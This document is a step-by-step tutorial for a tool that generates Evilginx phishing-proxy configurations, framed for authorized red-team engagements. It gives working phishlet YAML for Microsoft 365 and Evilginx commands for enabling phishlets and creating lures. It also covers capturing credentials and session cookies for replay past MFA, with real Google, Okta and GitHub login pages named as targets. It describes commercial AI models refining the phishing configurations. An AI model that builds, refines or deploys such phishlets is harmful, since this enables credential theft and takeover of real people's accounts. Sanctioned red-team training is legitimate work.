# Lesson 1: Using RTLPhishletGenerator

## Table of Contents

1. [Introduction](#1-introduction)
2. [Prerequisites](#2-prerequisites)
3. [Step 1: Accessing the Tool](#3-step-1-accessing-the-tool)
4. [Step 2: Entering the Target URL](#4-step-2-entering-the-target-url)
5. [Step 3: Understanding Analysis Results](#5-step-3-understanding-analysis-results)
6. [Step 4: Reviewing the Generated Phishlet](#6-step-4-reviewing-the-generated-phishlet)
7. [Step 5: Manual Adjustments](#7-step-5-manual-adjustments)
8. [Step 6: Exporting and Deploying](#8-step-6-exporting-and-deploying)
9. [Common Issues and False Positives](#9-common-issues-and-false-positives)
10. [Validation Checklist](#10-validation-checklist)
11. [Tips for Better Results](#11-tips-for-better-results)

---

## 1. Introduction

### What Is RTLPhishletGenerator?

RTLPhishletGenerator is a web-based tool that automates the creation of Evilginx v3 phishlet YAML configuration files. It is designed exclusively for authorized red team and purple team security testing engagements.

### What Does It Do?

When you provide a target login page URL, RTLPhishletGenerator performs the following operations automatically:

1. **Browser-based analysis** -- Uses Playwright (headless Chromium) to navigate to the target URL, rendering the page exactly as a real browser would.
2. **Login form detection** -- Identifies username, email, and password fields in HTML forms and single-page applications (SPAs).
3. **Domain discovery** -- Maps all domains and subdomains contacted during page load, classifying them as authentication-related or CDN/static asset domains.
4. **Cookie capture** -- Records every cookie set by every domain, then filters for session-relevant cookies using known patterns (e.g., `ESTSAUTH` for Microsoft, `SID` for Google, `sid` for Okta).
5. **Authentication flow tracing** -- Tracks redirects, API calls, and network requests to reconstruct the login flow step by step.
6. **Phishlet generation** -- Converts all discovered data into a valid Evilginx v3 phishlet YAML file with proxy hosts, auth tokens, credentials, sub-filters, force-post rules, and JavaScript injection blocks.
7. **Optional AI refinement** -- If an AI API key is configured (DeepSeek, Claude, OpenAI, or any litellm-compatible model), the generated phishlet is refined with platform-specific knowledge, missing subdomain detection, and additional sub-filter suggestions.
8. **Validation** -- Runs schema validation and cross-section logical checks to ensure the phishlet is structurally correct and internally consistent before export.

### Why Use It?

Manually creating Evilginx phishlets is time-consuming and error-prone. You need to:

- Identify every domain and subdomain involved in the login flow
- Determine which cookies are session tokens vs. analytics cookies
- Map credential field names correctly
- Write sub-filters for cross-domain URL rewriting
- Configure force-post rules for credential interception
- Test and iterate until the phishlet works

RTLPhishletGenerator handles the heavy lifting, producing a solid baseline phishlet that you can then refine for your specific engagement. Even experienced phishlet authors can use it to accelerate their workflow and catch domains or cookies they might have missed.

### Authorization Requirement

**This tool must only be used in authorized security testing engagements.** Before using RTLPhishletGenerator, you must have:

- Written authorization from the target organization
- A valid NDA or Statement of Work (SOW) for the engagement
- Compliance with all applicable laws and regulations

---

## 2. Prerequisites

Before you begin, ensure you have the following:

### Required

| Requirement | Details |
|---|---|
| **Running instance of RTLPhishletGenerator** | Either via Docker or manual setup (see below) |
| **Target URL** | The login page URL of the application you are authorized to test |
| **Modern web browser** | Chrome, Firefox, or Edge for accessing the web UI |

### Optional

| Requirement | Details |
|---|---|
| **AI API key** | A key for DeepSeek, Anthropic Claude, OpenAI, or any litellm-compatible provider. Set in the `.env` file as `AI_API_KEY`. This enables AI-powered refinement for more accurate phishlets. |

### Installation Options

#### Option A: Docker (Recommended)

```bash
cp .env.example .env
# Edit .env to add your AI API key (optional)
docker-compose up -d
```

This starts both the backend (FastAPI on port 8000) and frontend (served on port 3000).

#### Option B: Manual Setup

```bash
# Backend
cd backend
pip install -r requirements.txt
playwright install chromium
cd ..

# Frontend
cd frontend
npm install
cd ..

# Run both services
make dev
```

This starts the backend on port 8000 and the frontend dev server on port 5173.

### Configuring AI (Optional)

Copy `.env.example` to `.env` and set your API key and preferred model:

```env
AI_API_KEY=your-api-key-here
AI_MODEL=deepseek/deepseek-chat

# Other supported models:
# AI_MODEL=claude-3-5-sonnet-20241022
# AI_MODEL=gpt-4o
# AI_MODEL=anthropic/claude-3-haiku
```

The AI layer is entirely optional. The rule-based engine always produces a baseline phishlet. AI refines it with:

- Platform-specific cookie and credential knowledge
- Missing subdomain detection
- Cross-domain sub-filter suggestions
- JavaScript injection recommendations for SPA targets

---

## 3. Step 1: Accessing the Tool

### Opening the Web Interface

Once the application is running, open your browser and navigate to:

| Setup Method | URL |
|---|---|
| **Docker** | `http://localhost:3000` |
| **Manual (make dev)** | `http://localhost:5173` |

You will see the RTLPhishletGenerator home page with a dark-themed interface. The landing page displays four key features (Automated Analysis, AI Enhancement, Built-in Validation, YAML Editor) and a "How It Works" workflow summary.

### Navigating to the Generator

Click the **"Get Started"** button on the home page, or use the navigation sidebar to go to the **Generator** page. This is where the main workflow begins.

The Generator page follows a four-step wizard:

1. **Input** -- Enter your target URL and configuration
2. **Analyzing** -- Real-time progress as the tool scrapes and analyzes the target
3. **Review** -- Inspect discovered domains, forms, cookies, and auth flow
4. **Editor** -- View, edit, validate, and export the generated phishlet YAML

### API Documentation

The backend also exposes interactive API documentation at `http://localhost:8000/docs` (Swagger UI). This is useful if you want to integrate RTLPhishletGenerator into automated pipelines or call the API directly.

---

## 4. Step 2: Entering the Target URL

On the Generator page, you will see the input form with the following fields:

### Target URL

This is the most important field. Enter the full URL of the target application's **login page**.

**What makes a good target URL:**

| Good Target URL | Why |
|---|---|
| `https://login.microsoftonline.com/` | Direct login page for Microsoft 365 |
| `https://accounts.google.com/signin` | Google's authentication page |
| `https://dev-12345.okta.com/login/login.htm` | Okta login portal |
| `https://github.com/login` | GitHub's sign-in page |
| `https://app.example.com/auth/login` | Custom application login endpoint |

**What makes a bad target URL:**

| Bad Target URL | Why |
|---|---|
| `https://www.microsoft.com` | This is a marketing homepage, not a login page |
| `https://example.com` | Too generic; the tool needs the actual login endpoint |
| `https://example.com/dashboard` | This is a post-login page; you need the pre-login page |
| `http://localhost:8080/login` | Internal URLs that the tool cannot reach from its container |

**Key principle:** The URL should be the page where users actually enter their username and password. If the application uses a multi-step login (e.g., Microsoft where you enter email first, then password on a second screen), use the initial login URL -- the tool will follow redirects and detect subsequent steps.

### Author

Enter your handle or name (e.g., `@yourhandle`). This is written into the phishlet YAML file as metadata. It defaults to `@rtlphishletgen` if left empty.

### Custom Phishlet Name (Optional)

If left blank, the tool auto-detects a name from the target domain (e.g., `microsoft365`, `google`, `okta`). You can override this with any name you prefer. The name is used for the YAML filename and the `name:` field in the phishlet.

### AI Enhancement Toggle

If you have configured an AI API key in your `.env` file, you will see a toggle switch labeled **"AI Enhancement"** with the configured model name displayed below it (e.g., "Using deepseek/deepseek-chat"). Toggle this on to enable AI-powered refinement of the generated phishlet.

If no API key is configured, the toggle will be grayed out with the message "Configure an API key in .env to enable."

### Submitting

Click the **"Analyze & Generate"** button to start the analysis. The button will change to "Analyzing..." and the wizard will advance to the progress view.

---

## 5. Step 3: Understanding Analysis Results

After the analysis completes, the wizard advances to the **Review** step. This screen presents the analysis results organized into four tabs: **Domains**, **Login Forms**, **Cookies**, and **Auth Flow**.

At the top of the review screen, you will see:

- The **page title** of the target (e.g., "Sign in to your account")
- The **base domain** (e.g., `login.microsoftonline.com`)
- Indicator badges: **"MFA Detected"** if multi-factor authentication indicators were found, and **"JS Auth"** if the login uses JavaScript-based authentication (fetch/AJAX calls instead of traditional form POST)

### Tab 1: Domains

The Domains tab shows all domains and subdomains that the target page contacted during loading. Each domain entry displays:

- **Domain name** -- The base domain (e.g., `microsoftonline.com`)
- **Subdomains** -- Any subdomains observed (e.g., `login`, `aadcdn`)
- **Auth badge** -- A blue "Auth" badge if the domain is authentication-related (contains indicators like `login`, `auth`, `sso`, `oauth`, `account`, `id`, `adfs`, `sts`)
- **CDN badge** -- A gray "CDN" badge if the domain appears to serve static content (contains indicators like `cdn`, `static`, `assets`, `fonts`)

**How to read the domain map:**

- Domains marked as **Auth** will be included as `proxy_hosts` in the phishlet. These are the domains that Evilginx needs to proxy to maintain the authentication flow.
- Domains marked as **CDN** only (without Auth) are typically excluded from proxy hosts because they serve static assets that do not carry session data. However, some CDN domains do participate in authentication (e.g., serving JavaScript that handles token exchange). If the phishlet does not work after deployment, a missing CDN domain that actually participates in auth could be the reason.
- If a domain has both Auth and CDN badges, it will be included as a proxy host.

**What to look for:**

- Ensure all domains involved in the login flow are present. If you know a domain is part of the auth flow but it is missing, you will need to add it manually.
- Count the total number of auth-related domains. Complex enterprise logins (e.g., Microsoft 365 with ADFS federation) often involve 3-5 or more domains.

### Tab 2: Login Forms

The Login Forms tab displays detected HTML form elements that contain password fields. For each form, you will see:

- **Method and Action URL** -- e.g., `POST https://login.microsoftonline.com/common/login`
- **Submit button text** -- e.g., `"Sign in"`, `"Next"`, `"Log in"`
- **Fields** -- Each form field listed with its type, name, and placeholder text

Example output:

```
POST https://login.microsoftonline.com/common/login
Button: "Sign in"
  [email]    loginfmt     "Email, phone, or Skype"
  [password] passwd
```

**What to look for:**

- The **field names** (`loginfmt`, `passwd`, `email`, `password`, etc.) are what the generator uses to build the `credentials` section of the phishlet.
- If **no login forms are detected**, you will see a warning icon with the message "No login forms detected. The phishlet may need manual credential field configuration." This commonly happens with SPAs that build their login UI entirely in JavaScript without standard HTML `<form>` elements. The tool has a fallback detection strategy using Playwright selectors, but it may not catch every implementation.
- If the form uses a multi-step flow (email on one page, password on the next), only the fields visible during the initial page load may be detected. You may need to check the second step manually.

### Tab 3: Cookies

The Cookies tab shows all cookies observed during the page load, grouped by the domain that set them. Each domain section lists its cookie names as tags.

Example output:

```
login.microsoftonline.com
  ESTSAUTH  ESTSAUTHPERSISTENT  buid  x-ms-gateway-slice  stsservicecookie

.microsoftonline.com
  SignInStateCookie  ESTSAUTHLIGHT
```

**What to look for:**

- **Session cookies** -- These are the cookies that Evilginx needs to capture as `auth_tokens`. The generator uses a built-in database of known session cookies (Microsoft, Google, Okta, GitHub, AWS) plus pattern matching (`sess`, `auth`, `token`, `sid`, `login`, `sso`, `jwt`, `csrf`, `xsrf`) to identify which cookies are session-relevant.
- **Non-session cookies** -- Analytics cookies (e.g., `_ga`, `_gid`), preference cookies, and tracking pixels are not relevant for auth token capture and are filtered out by the generator.
- If you see cookies you know are critical for session persistence but are not being picked up, you will need to add them manually in the editor.

### Tab 4: Auth Flow

The Auth Flow tab shows the sequence of network requests and redirects that occurred during page load, reconstructing the authentication flow step by step. Each step displays:

- **Step number** -- Sequential order
- **URL** -- The full URL of the request
- **Description** -- What happened at this step
- **Status code** -- HTTP response code (green for 2xx/3xx, red for 4xx/5xx)
- **Cookies set** -- Which cookies were set in the response (highlighted in yellow)

Example output:

```
[1] https://login.microsoftonline.com/
    Initial navigation | Sets cookies: buid, ESTSAUTHLIGHT
    200

[2] https://login.microsoftonline.com/common/oauth2/authorize?client_id=...
    OAuth2 authorization redirect
    302

[3] https://login.microsoftonline.com/common/login
    Login form page | Sets cookies: x-ms-gateway-slice, stsservicecookie
    200
```

**What to look for:**

- The flow shows you exactly how the authentication process works. Understanding this is critical for debugging phishlets that do not work as expected.
- **Redirects** (302, 301 responses) indicate domain handoffs. Each redirect to a different domain means that domain likely needs to be in your proxy hosts.
- **Cookie-setting steps** show you where session tokens are created. The domain and step where a session cookie is first set is important for understanding the auth lifecycle.
- **API calls** to auth endpoints (`/oauth2/authorize`, `/api/auth/login`, `/token`) reveal the authentication protocol being used (OAuth2, SAML, custom API, etc.).

### Moving Forward

After reviewing all four tabs, click the **"Generate Phishlet"** button at the bottom of the review page. The tool will process the analysis data through its rule-based generator (and AI refinement if enabled) and produce the YAML output. You will then advance to the Editor step.

If you want to go back and try a different URL, click the **"Back"** button.

---

## 6. Step 4: Reviewing the Generated Phishlet

The Editor step presents a full-featured Monaco code editor (the same editor engine used in VS Code) with the generated phishlet YAML. On the right side, you will see a sidebar with validation results, generation notes, and a quick reference guide.

### Understanding the YAML Structure

Here is a breakdown of each section in the generated phishlet:

#### `name`

```yaml
name: 'microsoft365'
```

A short identifier for the phishlet. Used as the filename and referenced in Evilginx commands.

#### `author`

```yaml
author: '@yourhandle'
```

Your name or handle. Metadata only; does not affect functionality.

#### `min_ver`

```yaml
min_ver: '3.2.0'
```

The minimum Evilginx version required to use this phishlet. RTLPhishletGenerator defaults to `3.2.0` (configurable via the `EVILGINX_MIN_VER` environment variable).

#### `proxy_hosts`

```yaml
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: true, is_landing: false}
```

This is the core of the phishlet. Each entry defines a domain/subdomain that Evilginx will proxy:

| Field | Description |
|---|---|
| `phish_sub` | The subdomain used on the phishing domain (e.g., if your phishing domain is `evil.com`, this becomes `login.evil.com`) |
| `orig_sub` | The original subdomain on the legitimate domain |
| `domain` | The base domain being proxied |
| `session` | If `true`, Evilginx monitors this host for session cookies. Must be `true` for at least the main auth domain |
| `is_landing` | If `true`, this is the host where victims first land. Exactly one proxy host should have this set to `true` |

**Key rules:**
- At least one host must have `is_landing: true`
- At least one host must have `session: true`
- Every domain involved in the authentication flow must have an entry here

#### `sub_filters`

```yaml
sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'aadcdn', domain: 'msftauth.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
```

Sub-filters handle URL rewriting across domains. When the proxied page contains references to other domains (in HTML, JSON, or JavaScript), Evilginx uses sub-filters to rewrite those URLs to point to the phishing domain instead.

| Field | Description |
|---|---|
| `triggers_on` | The host whose responses trigger this filter |
| `orig_sub` | The original subdomain to find in responses |
| `domain` | The base domain to find in responses |
| `search` | The string pattern to search for (usually `{hostname}`) |
| `replace` | The replacement string (usually `{hostname}`, which Evilginx resolves dynamically) |
| `mimes` | MIME types of responses to filter (HTML, JSON, JavaScript) |

#### `auth_tokens`

```yaml
auth_tokens:
  - domain: '.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
```

This section defines which cookies Evilginx should capture as session tokens. When the victim authenticates, these cookies represent their authenticated session.

| Field | Description |
|---|---|
| `domain` | The cookie domain (usually starts with `.` for domain-wide cookies) |
| `keys` | List of cookie names to capture from this domain |

**Important:** If critical session cookies are missing from this list, the captured session will not work when replayed. This is the most common reason a phishlet "works" (victim sees the login page) but fails to capture a usable session.

#### `credentials`

```yaml
credentials:
  username:
    key: 'loginfmt'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
```

Defines how Evilginx extracts the victim's username and password from form submissions.

| Field | Description |
|---|---|
| `key` | The form field name (or regex pattern) to match in the POST body |
| `search` | A regex pattern to extract the value from the matched field. `(.*)` captures the entire value |
| `type` | Where to look: `post` (form body), `json` (JSON body), or `header` (HTTP header) |

If the tool could not identify the exact field names, it will use regex patterns like `(email|username|login|user|loginfmt|UserName)` as a fallback. You should replace these with the actual field names from the target.

#### `auth_urls`

```yaml
auth_urls:
  - '/dashboard'
```

URL patterns that indicate successful authentication. When the victim's browser is redirected to one of these URLs after login, Evilginx knows the authentication was successful and captures the session.

If the post-login URL could not be determined, this defaults to `/`. You should update it with the actual post-login landing page path.

#### `login`

```yaml
login:
  domain: 'login.microsoftonline.com'
  path: '/login'
```

Specifies the domain and path of the login page. This tells Evilginx where to direct victims and where the login form lives.

#### `force_post` (if present)

```yaml
force_post:
  - path: '/common/login'
    search:
      - {key: 'loginfmt', search: '.*'}
      - {key: 'passwd', search: '.*'}
    type: 'post'
```

Force-post rules tell Evilginx to intercept specific POST requests and extract data from them. This is used to ensure credential capture even when the form submission path differs from what was expected.

#### `js_inject` (if present)

```yaml
js_inject:
  - trigger_domains: ['login.microsoftonline.com']
    trigger_paths: ['/login']
    trigger_params: []
    script: |
      // Auto-generated JS injection for SPA auth interception
      document.addEventListener('submit', function(e) {
        // Form submission interceptor
      });
```

JavaScript injection blocks are generated when the tool detects that the target uses JavaScript-based authentication (SPA/AJAX calls). The injected script runs on the proxied page and can intercept form submissions, AJAX calls, or modify page behavior.

The auto-generated script is a template. For most SPA targets, you will need to customize this with target-specific logic.

### Toolbar Actions

The editor toolbar provides four actions:

| Button | Action |
|---|---|
| **Validate** | Runs the built-in validator against the current YAML content. Results appear in the sidebar |
| **Copy** | Copies the YAML content to your clipboard |
| **Download** | Downloads the YAML as a `.yaml` file named after the phishlet |
| **New** | Resets the wizard to start over with a new target |

### Sidebar Panels

- **Validation Result** -- Shows "Valid Phishlet" (green) or "Invalid Phishlet" (red) along with specific errors and warnings
- **Generation Notes** -- Warnings from the generation process (e.g., "No session cookies identified") and suggestions (e.g., "Phishlet was refined using AI analysis")
- **Quick Reference** -- A brief reminder of what each YAML section does

---

## 7. Step 5: Manual Adjustments

The auto-generated phishlet is a strong starting point, but it often requires manual refinements to handle the specific nuances of your target. Here are the most common adjustments.

### When Manual Edits Are Needed

1. **Missing proxy hosts** -- A domain involved in the auth flow was classified as CDN and excluded, or was not contacted during the initial page load (only appears after form submission).
2. **Incorrect or missing auth tokens** -- The tool did not recognize a custom session cookie, or included cookies that are not actually session-relevant.
3. **Wrong credential field names** -- The tool used a regex fallback instead of the actual field name, or the target uses JSON-based auth instead of form POST.
4. **Missing auth URLs** -- The post-login redirect URL was not detected because it requires actual authentication to reach.
5. **SPA-specific adjustments** -- JavaScript-heavy applications may need custom `js_inject` scripts or different `credential` types (e.g., `json` instead of `post`).
6. **Multi-step login flows** -- Targets where username and password are on separate pages may need additional configuration.

### Common Manual Fixes

#### Adding a Missing Proxy Host

If you know a domain is needed but was not included:

```yaml
proxy_hosts:
  # ... existing entries ...
  - {phish_sub: 'api', orig_sub: 'api', domain: 'example.com', session: true, is_landing: false}
```

#### Fixing Credential Field Names

If the tool used a regex pattern and you know the actual field names from inspecting the form:

```yaml
# Before (regex fallback):
credentials:
  username:
    key: '(email|username|login|user|loginfmt|UserName)'
    search: '(.*)'
    type: 'post'

# After (actual field name):
credentials:
  username:
    key: 'loginfmt'
    search: '(.*)'
    type: 'post'
```

#### Switching to JSON Credentials

For APIs that accept JSON bodies instead of form-encoded POST:

```yaml
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'json'
  password:
    key: 'password'
    search: '(.*)'
    type: 'json'
```

#### Adding Missing Session Cookies

If you identified additional session cookies using browser DevTools:

```yaml
auth_tokens:
  - domain: '.example.com'
    keys: ['session_id', 'auth_token', 'refresh_token', 'XSRF-TOKEN']
```

#### Setting the Correct Auth URL

If you know the post-login redirect:

```yaml
auth_urls:
  - '/app/dashboard'
  - '/home'
```

### Using the Validator

After making edits, always click the **Validate** button in the toolbar. The validator checks for:

**Errors (will prevent the phishlet from working):**
- Missing required sections (`name`, `min_ver`, `proxy_hosts`, `auth_tokens`, `credentials`, `login`)
- Empty proxy_hosts list
- No `is_landing: true` proxy host
- Missing `domain` in auth_tokens entries
- Missing `key` in credential fields
- Missing `domain` or `path` in login section

**Warnings (potential issues to review):**
- Multiple proxy_hosts with `is_landing: true`
- No proxy_host with `session: true`
- No username or password defined in credentials
- Login domain not found in proxy_hosts
- Auth token domain not covered by any proxy_host

Fix all errors before exporting. Review warnings and address any that indicate real issues with your configuration.

---

## 8. Step 6: Exporting and Deploying

### Downloading the YAML File

Click the **Download** button in the editor toolbar. The file will be saved as `<phishlet-name>.yaml` (e.g., `microsoft365.yaml`).

Alternatively, click **Copy** to copy the YAML content to your clipboard and paste it into a file manually.

### Placing the Phishlet in Evilginx

Copy the downloaded `.yaml` file to your Evilginx phishlets directory:

```bash
# Default Evilginx phishlets directory
cp microsoft365.yaml ~/.evilginx/phishlets/

# Or, if using a custom directory specified in your Evilginx config
cp microsoft365.yaml /path/to/evilginx/phishlets/
```

### Loading the Phishlet in Evilginx

Start or restart Evilginx to load the new phishlet:

```bash
# Start Evilginx (it auto-loads phishlets from the phishlets directory)
sudo evilginx2

# Inside the Evilginx console, verify the phishlet is loaded
phishlets

# Enable the phishlet
phishlets hostname microsoft365 your-phishing-domain.com
phishlets enable microsoft365

# Create a lure
lures create microsoft365
lures get-url 0
```

### Testing Before Deployment

**Always test in a controlled environment before using in an engagement:**

1. **Evilginx debug mode** -- Run Evilginx with debug logging enabled to see exactly what is being proxied, which cookies are captured, and where failures occur.

2. **Self-test** -- Visit the phishing URL yourself and walk through the login flow. Check:
   - Does the login page render correctly?
   - Can you enter credentials and submit the form?
   - Are credentials captured in the Evilginx console?
   - Is the session (auth tokens/cookies) captured?
   - Does the post-login redirect work, or do you hit an error?

3. **Session replay** -- After capturing a test session, try replaying the session cookies in a clean browser to verify they grant access to the target application.

---

## 9. Common Issues and False Positives

### Single-Page Application (SPA) / JavaScript-Based Authentication

**Symptom:** No login forms detected; credentials not captured even though the phishing page renders correctly.

**Cause:** Modern SPAs (React, Angular, Vue) often build login forms dynamically in JavaScript and submit credentials via `fetch()` or `XMLHttpRequest` rather than traditional HTML form POST. The tool attempts to detect these using Playwright selectors, but may miss complex implementations.

**Solutions:**
- Check if `uses_javascript_auth` was flagged in the analysis
- Open the target login page in your browser, open DevTools (Network tab), and submit a test login. Note the exact API endpoint, request method, content type, and field names
- Update `credentials` with `type: 'json'` if the API uses JSON bodies
- Add a `js_inject` block with a custom script to intercept the specific API call
- Use AI enhancement, which is better at identifying SPA auth patterns

### Multi-Step Authentication Flows

**Symptom:** Only the username field is detected; the password page is not analyzed.

**Cause:** Some login flows (notably Microsoft 365) show the username field first, then redirect to a password page after validating the username. Since the tool loads the initial page without submitting credentials, it only sees the first step.

**Solutions:**
- Manually add the password field to the `credentials` section if it is not detected
- If the password is submitted to a different endpoint, add a `force_post` rule for that endpoint
- The tool's known-platform patterns include pre-built credential mappings for Microsoft, Google, Okta, and GitHub, which handle multi-step flows automatically. If the platform is recognized, the correct fields are usually populated

### CAPTCHA and Bot Protection

**Symptom:** The analysis returns minimal results; the page shows a CAPTCHA challenge instead of the login form.

**Cause:** Some login pages present CAPTCHA challenges, Cloudflare turnstiles, or bot detection screens when they detect automated browsers.

**Solutions:**
- This is a limitation of automated analysis. The tool uses a realistic user agent and viewport size, but aggressive bot protection may still trigger
- Try running the analysis again; some CAPTCHA systems are intermittent
- Manually construct the phishlet by inspecting the login page in your own browser
- Note that if the target has aggressive bot protection on their login page, Evilginx itself may also face challenges during the actual phishing engagement

### CDN Domains vs. Session Domains

**Symptom:** The phishlet does not work; the login page renders but authentication fails or redirects break.

**Cause:** A domain was classified as CDN-only and excluded from `proxy_hosts`, but it actually participates in the auth flow (e.g., serving JavaScript that handles token exchange or OAuth redirects).

**Solutions:**
- Review the Domains tab carefully. If a domain is marked as CDN but you suspect it is auth-related, it should be added as a proxy host
- Common culprits: `aadcdn.msftauth.net` (Microsoft), `apis.google.com` (Google), domains serving SAML metadata
- Add the domain manually with `session: false` if it does not set session cookies, or `session: true` if it does

### OAuth and SAML Redirects

**Symptom:** The login flow breaks after the initial page. The browser hits an error or redirects to the real site instead of the phishing proxy.

**Cause:** OAuth2 and SAML flows involve redirects through identity provider domains, callback URLs, and token exchange endpoints. If any domain in this chain is not in `proxy_hosts`, the redirect will go to the real domain instead of through the proxy.

**Solutions:**
- Trace the full redirect chain in the Auth Flow tab. Every domain that appears in a redirect must be a proxy host
- Pay special attention to OAuth callback URLs (`redirect_uri` parameters) and SAML assertion consumer service URLs
- Ensure sub_filters are correctly rewriting cross-domain URLs in responses

### Missing or Incorrect Session Cookies

**Symptom:** The phishing page works, credentials are captured, but the captured session does not grant access when replayed.

**Cause:** Critical session cookies were not included in `auth_tokens`, or the wrong cookies were captured.

**Solutions:**
- Use browser DevTools (Application > Cookies) to manually identify which cookies are set after a successful login
- Compare the cookies in DevTools with the cookies in your phishlet's `auth_tokens` section
- Focus on cookies that are: (a) set during or immediately after authentication, (b) HttpOnly, (c) have a long expiry or are session cookies, (d) have names suggesting session/auth purpose
- Add any missing cookies to the `auth_tokens` section

### False Positive: Non-Session Cookies in auth_tokens

**Symptom:** The phishlet has too many cookies in `auth_tokens`, including analytics and tracking cookies.

**Cause:** The pattern-matching algorithm may flag cookies with names like `_csrf_token` (a CSRF token, not a session cookie) or cookies from domains that are not actually auth-related.

**Solutions:**
- Review each cookie in `auth_tokens` and remove any that are clearly not session cookies
- Common false positives: analytics cookies (`_ga`, `_gid`, `_fbp`), preference cookies (`lang`, `theme`, `tz`), advertising cookies
- When in doubt, keep the cookie; having extra cookies in `auth_tokens` is usually harmless, while missing a critical one will break session capture

---

## 10. Validation Checklist

Before deploying a phishlet in an engagement, verify the following items. Use this checklist to ensure completeness and correctness.

### Structure and Syntax

- [ ] YAML parses without errors (run the built-in Validate function)
- [ ] All required sections are present: `name`, `min_ver`, `proxy_hosts`, `auth_tokens`, `credentials`, `login`
- [ ] `min_ver` matches your Evilginx version (3.2.0 or higher)
- [ ] No YAML formatting issues (correct indentation, proper quoting of strings)

### Proxy Hosts

- [ ] Exactly one proxy host has `is_landing: true`
- [ ] At least one proxy host has `session: true`
- [ ] All domains involved in the authentication flow are included
- [ ] The login page domain is present as a proxy host
- [ ] Identity provider domains (if using SSO/OAuth/SAML) are included
- [ ] Subdomains are correctly mapped (`phish_sub` and `orig_sub` match the real subdomains)

### Auth Tokens

- [ ] Session cookies for the primary auth domain are included
- [ ] Session cookies for any identity provider domains are included
- [ ] Cookie domain values start with `.` for domain-wide cookies
- [ ] No analytics or tracking cookies are unnecessarily included
- [ ] Known critical cookies for the platform are present (e.g., `ESTSAUTH` and `ESTSAUTHPERSISTENT` for Microsoft)

### Credentials

- [ ] Username field key matches the actual form field name (not a regex fallback)
- [ ] Password field key matches the actual form field name
- [ ] `type` is correct: `post` for form submissions, `json` for API calls
- [ ] `search` pattern is `(.*)` to capture the full value

### Auth URLs

- [ ] At least one auth URL pattern is defined
- [ ] The URL pattern matches the actual post-login redirect path
- [ ] The pattern is specific enough to avoid false triggers but general enough to catch variations

### Login

- [ ] `domain` matches the login page hostname (including subdomain)
- [ ] `path` matches the login page URL path
- [ ] The domain and path combination resolves to the actual login form

### Sub Filters

- [ ] Cross-domain URL references are covered by sub-filter rules
- [ ] MIME types include at least `text/html` and `application/javascript`
- [ ] `triggers_on` host is correct for each filter

### Force Post (if applicable)

- [ ] POST paths match the actual form submission endpoints
- [ ] Search keys match the credential field names
- [ ] `type` is correct (`post` or `json`)

### Functional Testing

- [ ] Tested in Evilginx debug mode
- [ ] Login page renders correctly through the proxy
- [ ] Credential submission works (not blocked, not erroring)
- [ ] Credentials are captured in Evilginx output
- [ ] Session tokens are captured after authentication
- [ ] Post-login redirect works (victim lands on the real application)
- [ ] Captured session cookies are valid and can be replayed

---

## 11. Tips for Better Results

### Use the Actual Login Page URL

The single most important factor for good results is providing the correct URL. Do not use the application's homepage or marketing page. Navigate to the login page in your browser first, copy the URL from the address bar, and paste it into RTLPhishletGenerator.

For applications with SSO or federated login, use the URL that the user would actually see when they click "Sign In." This may involve a redirect through an identity provider (e.g., Okta, Azure AD), and that is fine -- the tool follows redirects and maps the full chain.

### Check Browser DevTools Before and After

Before running the tool, spend a few minutes examining the target login page in your browser's DevTools:

1. **Network tab** -- Clear the network log, then load the login page. Note which domains are contacted, which requests set cookies, and which endpoints are called during login.
2. **Application tab > Cookies** -- Look at all cookies after page load. Note their names, domains, and flags (HttpOnly, Secure, SameSite).
3. **Submit a test login** (using test credentials or a test account in the authorized environment) and observe:
   - The form submission request (method, URL, content type, body)
   - Any API calls during authentication
   - The redirect chain after successful login
   - New cookies set after authentication

This manual reconnaissance gives you ground truth to compare against the tool's output.

### Enable AI for Complex Targets

For straightforward login pages with standard HTML forms, the rule-based engine produces good results. For complex targets, enable AI enhancement:

- **Enterprise SSO** (Microsoft 365, Google Workspace, Okta) -- AI knows platform-specific cookies and flow patterns
- **SPAs with API-based auth** -- AI can identify JavaScript auth patterns and suggest `js_inject` scripts
- **Multi-domain auth flows** -- AI can detect missing subdomains that the scraper might not have caught
- **Custom/proprietary platforms** -- AI can infer credential field names and auth URLs from context

### Test with Evilginx in Debug Mode

Always test your phishlet in a controlled environment first:

```bash
# Run Evilginx with verbose debug logging
sudo evilginx2 -debug

# Or, if using the Go-based Evilginx3
sudo ./evilginx -debug
```

Debug mode shows you exactly what Evilginx is doing: which requests are being proxied, which responses are being filtered, which cookies are being captured, and where errors occur. This is invaluable for diagnosing issues.

### Iterate on Failed Captures

If the phishlet renders the login page but fails to capture credentials or session tokens:

1. Check Evilginx debug output for errors
2. Compare the Evilginx proxy traffic against what you see in browser DevTools on the real site
3. Look for missing proxy hosts (domains that the real login contacts but are not being proxied)
4. Check if the credential field names match what the form actually sends
5. Verify auth_tokens contain the right cookies
6. Look for JavaScript errors in the browser console on the phishing page (these often indicate missing sub-filters or proxy hosts)

### Use the Validation Feature Frequently

Get into the habit of clicking **Validate** after every edit you make in the Monaco editor. The validator catches common mistakes immediately, saving you debugging time in Evilginx.

### Keep Phishlets Updated

Login pages change over time. A phishlet that worked last month may not work today because the target:

- Changed form field names
- Added new subdomains
- Modified their cookie structure
- Added CAPTCHA or bot protection
- Changed their OAuth flow

Before each engagement, re-run the target URL through RTLPhishletGenerator to get a fresh baseline, then apply your manual refinements on top.

### Document Your Changes

When you make manual edits to a generated phishlet, add YAML comments documenting what you changed and why:

```yaml
auth_tokens:
  - domain: '.example.com'
    keys:
      - 'session_id'
      - 'auth_token'
      # Added manually - set after MFA completion
      - 'mfa_verified'
```

This helps when you need to regenerate the phishlet later and reapply your customizations.

---

## Summary

RTLPhishletGenerator streamlines the phishlet creation process from hours of manual work to minutes of automated analysis. The workflow is:

1. **Enter the target login URL** with your author name and optional AI enhancement
2. **Review the analysis** across domains, forms, cookies, and auth flow
3. **Generate the phishlet** YAML automatically
4. **Edit and validate** in the built-in Monaco editor
5. **Export and deploy** to your Evilginx instance
